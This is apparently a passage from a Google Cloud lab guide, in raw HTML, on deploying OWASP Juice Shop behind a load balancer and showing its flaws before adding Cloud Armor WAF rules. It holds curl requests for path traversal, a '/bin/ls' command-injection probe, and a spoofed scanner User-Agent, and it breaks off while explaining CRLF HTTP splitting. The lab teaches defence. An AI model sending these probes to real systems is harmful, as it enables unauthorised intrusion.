cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute target-http-proxies create juice-shop-proxy \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  --url-map juice-shop-loadbalancer</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  URL_MAP</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">juice-shop-proxy  juice-shop-loadbalancer</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><h3 id='set-up-the-cloud-load-balancer-component-forwarding-rule'><span>Set up the Cloud load balancer component: forwarding rule</span></h3><ul><li><p><span>In Cloud Shell, enter the following command to create the forwarding rule for the Load Balancer:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute forwarding-rules create juice-shop-rule \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  --global \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  --target-http-proxy=juice-shop-proxy \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  --ports=80</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Created [https://www.googleapis.com/compute/v1/projects/cythom-host1/global/forwardingRules/juice-shop-rule].</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><h3 id='verify-the-juice-shop-service-is-online'><span>Verify the Juice Shop service is online</span></h3><ol start='' ><li><p><span>From Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PUBLIC_SVC_IP="$(gcloud compute forwarding-rules describe juice-shop-rule  --global --format="value(IPAddress)")"</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo $PUBLIC_SVC_IP</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;public VIP of service&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Wait a few minutes before continuing on, else you may retrieve a HTTP/1.1 404 Not Found response.</span></p><ol start='' ><li><p><span>From Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -Ii http://$PUBLIC_SVC_IP</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">HTTP/1.1 200 OK</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;...&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>You can also go to the browser to view the Juice Shop!</span></p><p><img src="images\xMu5EUJ8kCR2UPq%2BZ84gkf9d9p5o7wpNOY1mgjU8ijU%3D" referrerpolicy="no-referrer" alt="The Welcome to OWASP Juice Shop page"></p><p><span>You&#39;re now ready to explore the Juice Shop vulnerabilities and protect against them with Cloud Armor WAF rule sets.</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Set up the Cloud load balancer component- health check</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-3-demonstrate-known-vulnerabilities'><span>Task 3. Demonstrate known vulnerabilities</span></h2><p><span>In this lab, you demonstrate the states before and after Cloud Armor WAF rules are propagated in condensed steps.</span></p><h3 id='observe-an-lfi-vulnerability-path-traversal'><span>Observe an LFI vulnerability: path traversal</span></h3><p><span>Local File Inclusion is the process of observing files present on the server by exploiting lack of input validation in the request to potentially expose sensitive data. The following shows a path traversal is possible. In your browser or with curl, observe an existing path served by the application.</span></p><ol start='' ><li><p><span>From Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -Ii http://$PUBLIC_SVC_IP/ftp</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">HTTP/1.1 200 OK</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;...&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Observe that path traversal works too.</span></p><ol start='' ><li><p><span>From Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -Ii http://$PUBLIC_SVC_IP/ftp/../</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">HTTP/1.1 200 OK</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;...&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><h3 id='observe-an-rce-vulnerability'><span>Observe an RCE vulnerability</span></h3><p><span>Remote Code Execution includes various UNIX and Windows command injection scenarios allowing attackers to execute OS commands usually restricted to privileged users. The following shows a simple </span><code>ls</code><span> command execution passed in.</span></p><ul><li><p><span>From Cloud Shell:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -Ii http://$PUBLIC_SVC_IP/ftp?doc=/bin/ls</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">HTTP/1.1 200 OK</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;...&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Remove the curl flags to observe the full output.</span></p><h3 id='observe-a-well-known-scanners-access'><span>Observe a well-known scanner&#39;s access</span></h3><p><span>Both commercial and open source scan applications for various purposes, including to find vulnerabilities. These tools use well-known User-Agent and other Headers. Observe curl works with a well-known User-Agent Header.</span></p><ul><li><p><span>In Cloud Shell:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -Ii http://$PUBLIC_SVC_IP -H "User-Agent: blackwidow"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">HTTP/1.1 200 OK</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;...&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><h3 id='observe-a-protocol-attack-http-splitting'><span>Observe a protocol attack: HTTP splitting</span></h3><p><span>Some web applications use input from the user to generate the headers in the responses. If the application doesn&#39;t properly filter the input, an attacker can potentially poison the input parameter with the sequence </span><code>%0d%0a</code><span> (the CRLF sequence that is used to separate different 